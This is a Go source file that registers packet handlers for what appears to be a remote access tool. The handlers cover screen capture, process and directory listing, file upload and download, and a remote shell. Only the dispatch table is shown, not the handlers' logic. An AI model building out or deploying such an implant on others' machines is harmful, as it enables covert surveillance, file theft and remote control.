package main

import (
	"rat/shared"
)

type PacketMap map[shared.PacketHeader]IncomingPacket

var packets PacketMap

type OutgoingPacket interface {
	Header() shared.PacketHeader
	Init(c *Client)
}

type IncomingPacket interface {
	OnReceive(c *Client) error
}

type Packet struct{}

func InitPackets() {
	packets = make(PacketMap)
	packets[shared.PingHeader] = Ping{}
	packets[shared.ComputerInfoHeader] = ComputerInfoPacket{}
	packets[shared.ScreenHeader] = ScreenPacket{}
	packets[shared.ProcessHeader] = ProcessPacket{}
	packets[shared.MonitorsHeader] = MonitorsPacket{}
	packets[shared.DirectoryHeader] = DirectoryPacket{}
	packets[shared.PutFileHeader] = UploadPacket{}
	packets[shared.GetFileHeader] = DownloadPacket{}
	packets[shared.ShellHeader] = ShellPacket{}
	packets[shared.WindowsHeader] = WindowsPacket{}
}

func GetIncomingPacket(header shared.PacketHeader) IncomingPacket {
	return packets[header]
}
